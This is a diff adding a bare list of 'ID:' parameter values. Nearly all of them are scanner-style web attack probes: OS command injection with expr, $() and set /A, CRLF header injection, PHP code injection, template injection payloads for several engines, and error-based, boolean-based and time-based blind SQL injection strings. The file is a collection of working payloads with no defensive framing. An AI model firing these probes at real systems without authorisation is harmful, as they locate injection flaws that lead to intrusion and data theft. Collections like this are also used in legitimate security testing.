@@ -1,0 +1,45 @@
+ID:1
+ID:1
+CRLF-Header:CRLF-Value
+expr 933257135 + 976942524
+
+ID:<ejofkoljpq>
+ID:1|expr 866561092 + 965893003 
+ID:1%0d%0aCRLF-Header:CRLF-Value
+ID:1$(expr 814799718 + 814574808)
+ID:1&set /A 943576706+816375773
+ID:${@var_dump(md5(935345442))};
+ID:1\r\nCRLF-Header:CRLF-Value
+ID:'-var_dump(md5(565612848))-'
+ID:/*1*/{{966238279+904413632}}
+ID:${857818558+998108584}
+ID:${(870061582+938764107)?c}
+ID:#set($c=934184994+910085483)${c}$c
+ID:<%- 803365311+964482023 %>
+ID:1
+ID:1
+ID:1
+ID:1'and/**/extractvalue(1,concat(char(126),md5(1470085689)))and'
+ID:1"and/**/extractvalue(1,concat(char(126),md5(1533142213)))and"
+ID:extractvalue(1,concat(char(126),md5(1253886641)))
+ID:1'and(select'1'from/**/cast(md5(1094167000)as/**/int))>'0
+ID:1/**/and/**/cast(md5('1447740930')as/**/int)>0
+ID:convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1212899712')))
+ID:1'and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1052947019')))>'0
+ID:1鎈'"\(
+ID:1/**/and+3=3
+ID:1/**/and+3=6
+ID:1'and'u'='u
+ID:1'and'd'='r
+ID:1"and"n"="n
+ID:1"and"a"="f
+ID:1
+ID:1
+ID:1
+ID:(select*from(select+sleep(0)union/**/select+1)a)
+ID:(select*from(select+sleep(2)union/**/select+1)a)
+ID:1'and(select*from(select+sleep(0))a/**/union/**/select+1)='
+ID:1'and(select*from(select+sleep(2))a/**/union/**/select+1)='
+ID:1"and(select*from(select+sleep(0))a/**/union/**/select+1)="
+ID:1"and(select*from(select+sleep(2))a/**/union/**/select+1)="
+ID:1"and(select*from(select+sleep(3))a/**/union/**/select+1)="
